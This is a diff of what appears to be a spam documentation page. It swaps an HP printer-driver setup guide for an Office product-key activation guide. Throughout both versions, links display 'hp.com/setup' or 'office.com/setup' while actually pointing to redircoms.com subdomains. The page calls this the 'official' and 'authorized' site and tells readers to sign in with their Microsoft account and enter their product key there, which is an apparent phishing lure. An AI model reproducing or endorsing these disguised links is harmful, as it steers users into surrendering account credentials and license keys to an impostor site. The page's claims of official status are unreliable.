@@ -1,9 +1,9 @@
 ##################
-How Do I Download, Install, and Set Up My HP Printer Driver?
+Where to enter your Office product key?
 ##################
 
 .. meta::
-   :msvalidate.01: 108BF3BCC1EC90CA1EBEFF8001FAEFEA
+   :msvalidate.01: 98C899EEC245D9CBFD6A1AD132F06457
 
 .. image:: blank.png
       :width: 350px
@@ -14,8 +14,8 @@ How Do I Download, Install, and Set Up My HP Printer Driver?
       :width: 350px
       :align: center
       :height: 100px
-      :alt: hp.com/setup
-      :target: https://hp.redircoms.com
+      :alt: office.com/setup
+      :target: https://ms.redircoms.com
 
 .. image:: blank.png
       :width: 350px
@@ -28,46 +28,35 @@ How Do I Download, Install, and Set Up My HP Printer Driver?
 
 
 
-There are 5 simple stages to download, install, and set up your HP printer driver on your computer. Follow each stage one by one to successfully connect your printer via `hp.com/setup <https://hp.redircoms.com>`_. HP’s setup site provides the latest drivers and simple installation steps. It’s the fastest way to ensure your printer works seamlessly with your computer. Visit `hp.com/setup <https://hp.redircoms.com>`_, download the right driver, and get your printer ready to use in minutes.
+If you’ve purchased a Microsoft Office product and are wondering **where to enter your Office product key**, you’ll need to visit the official activation page: `office.com/setup <https://ms.redircoms.com>`_. This is the authorized site where users can redeem and activate their Office subscription or standalone product.
 
-**********
-Steps to Download HP Printer Driver
-**********
+How to Enter Your Office Product Key
+-------------------------------------
 
-1. Open a web browser and go to `hp.com/setup <https://hp.redircoms.com>`_.
+Follow these simple steps to redeem your Office product key:
 
-2. Enter your HP printer model in the search box.
+1. Open a web browser and go to `office.com/setup <https://ms.redircoms.com>`_.
+2. Sign in with your Microsoft account. If you don’t have one, you’ll need to create it.
+3. On the setup page, you will see a prompt to **enter your Office product key**. This 25-character alphanumeric code is usually found:
+   - Inside the product packaging,
+   - In the confirmation email (if purchased online),
+   - Or under a scratch-off label (for physical purchases).
+4. After entering the product key, follow the on-screen instructions to download and install Office.
 
-3. Select your operating system if prompted.
+Why Activation is Important
+----------------------------
 
-4. Click on **Download** to get the latest driver and software package.
+Entering your Office product key ensures that:
+- Your copy of Office is genuine,
+- You get access to the correct version and features,
+- Your license is linked to your Microsoft account for easy recovery in the future.
 
-5. Save the installer file to your computer.
+Still Need Help?
+-----------------
 
-**********
-Steps to Install HP Printer Driver
-**********
+If you encounter any issues while activating Office, make sure:
+- Your product key hasn’t been used already,
+- You’re entering the key exactly as printed,
+- You’re signed in with the correct Microsoft account.
 
-1. Locate the downloaded installer file on your computer.
-
-2. Double-click the installer to begin the setup process.
-
-3. Follow the on-screen instructions and accept the license agreement.
-
-4. Choose your connection type (USB or Wireless).
-
-5. Complete the installation by clicking **Finish**.
-
-**********
-Setting Up Your HP Printer
-**********
-
-1. Make sure your HP printer is powered on.
-
-2. For wireless setup, ensure your printer and computer are on the same Wi-Fi network.
-
-3. Open the HP driver or utility you installed.
-
-4. Follow on-screen prompts to detect and connect your printer.
-
-5. Once connected, print a test page to verify setup is complete.
+Visit `office.com/setup <https://ms.redircoms.com>`_ to get started and ensure your Office software is properly activated.
